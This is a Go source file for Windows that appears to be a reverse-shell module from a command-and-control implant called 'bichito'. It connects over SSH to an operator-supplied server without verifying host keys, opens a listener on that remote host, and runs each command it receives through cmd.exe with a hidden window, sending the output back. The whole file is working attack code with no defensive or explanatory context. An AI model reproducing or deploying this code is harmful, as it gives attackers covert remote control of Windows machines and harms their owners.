// +build windows


package biterpreter

import (
	
	"bufio"
	"bytes"
	"net"
	"os/exec"
	"syscall"

	"golang.org/x/crypto/ssh"

	//Fixes
	"time"
	"encoding/json"
)

type InjectRevSshShellBichito struct {
    Domain string   `json:"domain"`
    Sshkey string   `json:"sshkey"`
    Port string   `json:"port"`
    User string   `json:"user"`
}


func RevSshShell(jsonparams string) (bool,string){

	var revsshshellparams *InjectRevSshShellBichito
	errDaws := json.Unmarshal([]byte(jsonparams),&revsshshellparams)
	if errDaws != nil {
		return true,"Parameters JSON Decoding error:"+errDaws.Error()
	}

	auth, err := loadPrivateKey(revsshshellparams.Sshkey)
	if err != nil {
		return true,"Load Key String error"
	}

	config := &ssh.ClientConfig{
		User: revsshshellparams.User,
		Auth: nil,
	    HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
            return nil
        },
        Timeout:time.Second * 1,
	}

	config.Auth = append(config.Auth, auth)

	// Dial the SSH connection
	sshConn, err := ssh.Dial("tcp", revsshshellparams.Domain+":"+revsshshellparams.Port, config)
	if err != nil {
		return true,"Error: error dialing remote host:"+err.Error()
	}


	// Listen on remote
	l, err := sshConn.Listen("tcp", "127.0.0.1:2222")
	if err != nil {
		return true,"Error: error listening on remote host:"+err.Error()
	}

	go listenSSH(sshConn,l)

	return false,"Success: Rev SSH Shell Connected to Staging"
}


func listenSSH(sshconn *ssh.Client,l net.Listener){

	defer sshconn.Close()

	// Start accepting shell connections
	for {
		conn, err := l.Accept()
		if err != nil {
			continue
		}

		handleConnection(conn)

		return
	}
}

func handleConnection(c net.Conn) {
	defer c.Close()

	r := bufio.NewReader(c)
	for{
		order, err := r.ReadString('\n')
		if nil != err {
			return
		}

		var outbuf,errbuf bytes.Buffer
		//fmt.Println(order)

		// Start the command
		cmd := exec.Command("C:\\Windows\\System32\\cmd.exe","/c",order+"\n")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

		cmd.Stdout = &outbuf
		cmd.Stderr = &errbuf

		// Start command
		//err = cmd.Start()
		err = cmd.Run()
		if err != nil {
			//log.Printf("error: could not start command: %s", err)
			//return
		}

		//fmt.Println(outbuf.String())

		//out, _ := cmd.CombinedOutput()
		//fmt.Println(out)
		c.Write([]byte(outbuf.String()))
		c.Write([]byte(errbuf.String()))
	}

}

func loadPrivateKey(keyString string) (ssh.AuthMethod, error) {


	signer, signerErr := ssh.ParsePrivateKey([]byte(keyString))
	if signerErr != nil {
		return nil, signerErr
	}
	return ssh.PublicKeys(signer), nil
}